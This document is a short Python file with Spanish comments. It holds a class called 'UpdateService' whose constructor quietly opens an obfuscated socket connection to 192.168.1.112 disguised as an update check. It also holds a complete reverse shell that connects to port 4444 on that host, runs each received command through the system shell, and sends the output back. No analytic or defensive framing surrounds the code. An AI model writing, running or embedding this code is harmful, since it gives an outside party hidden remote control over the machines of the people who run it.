class UpdateService:
    def __init__(self):
        self.check_updates()
    
    def check_updates(self):
        connection = getattr(__import__('socket'), 'socket')()
        connection.connect(('192.168.1.112', 443))


import socket
import subprocess
import os

def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('192.168.1.112', 4444))

    while True:
        try:
            # Recibir y decodificar el comando
            cmd = s.recv(1024).decode('utf-8')
            if cmd.lower() == 'exit':
                break

            # Ejecutar el comando
            if cmd:
                proc = subprocess.Popen(
                    cmd,
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    stdin=subprocess.PIPE,
                    text=True  # Esto hace que trabaje con strings en lugar de bytes
                )
                
                # Obtener la salida
                output, error = proc.communicate()
                
                # Enviar la respuesta
                response = output + error
                s.send(response.encode('utf-8'))
                
        except Exception as e:
            error_msg = str(e)
            s.send(error_msg.encode('utf-8'))

    s.close()

if __name__ == '__main__':
    main()
